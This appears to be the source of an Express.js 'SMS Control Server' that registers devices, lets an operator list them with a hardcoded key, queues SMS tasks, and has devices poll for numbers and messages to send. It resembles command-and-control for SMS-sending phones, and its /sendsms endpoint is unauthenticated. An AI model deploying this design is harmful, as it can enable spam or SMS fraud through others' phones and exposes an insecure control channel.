const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

const PRIVATE_KEY = "12345";

let devices = new Set();   // all registered deviceIds
let tasks = {};            // deviceId -> sms task

// Health check
app.get("/", (req, res) => {
  res.send("SMS Control Server Running ✅");
});

// 1️⃣ REGISTER DEVICE
app.post("/register", (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) {
    return res.status(400).json({ error: "deviceId required" });
  }

  devices.add(deviceId);
  res.json({ status: "registered", deviceId });
});

// 2️⃣ FETCH ALL DEVICES (PRIVATE KEY)
app.post("/fetch", (req, res) => {
  const key = req.headers["x-private-key"];

  if (key !== PRIVATE_KEY) {
    return res.status(401).json({ error: "Invalid private key" });
  }

  res.json({
    total: devices.size,
    devices: Array.from(devices)
  });
});

// 3️⃣ SEND SMS COMMAND
app.post("/sendsms", (req, res) => {
  const { deviceId, number, message } = req.body;

  if (!devices.has(deviceId)) {
    return res.status(404).json({ error: "Device not registered" });
  }

  tasks[deviceId] = { number, message };
  res.json({ status: "sms_queued" });
});

// 4️⃣ DEVICE POLLING
app.get("/task/:deviceId", (req, res) => {
  const deviceId = req.params.deviceId;

  if (tasks[deviceId]) {
    const task = tasks[deviceId];
    delete tasks[deviceId];

    return res.json({
      send: true,
      number: task.number,
      message: task.message
    });
  }

  res.json({ send: false });
});

// Render compatible port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
